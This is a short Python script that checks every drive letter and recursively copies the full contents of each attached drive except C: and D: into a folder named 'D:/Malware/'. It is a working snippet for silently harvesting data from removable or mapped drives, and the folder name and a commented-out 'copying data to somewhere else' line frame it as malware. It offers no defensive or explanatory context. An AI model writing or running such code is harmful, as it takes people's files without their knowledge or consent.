import os
import shutil

for i in range(65, 91):  # Loop from A to Z
    drive = f"{chr(i)}:/"  # Create the drive name
    # Check if the drive exists and is neither C: nor D:
    if os.path.exists(drive) and drive not in ['C:/', 'D:/']:
        # print(f"Copying {drive} data to somewhere else")
        shutil.copytree(drive, "D:/Malware/", dirs_exist_ok=True)
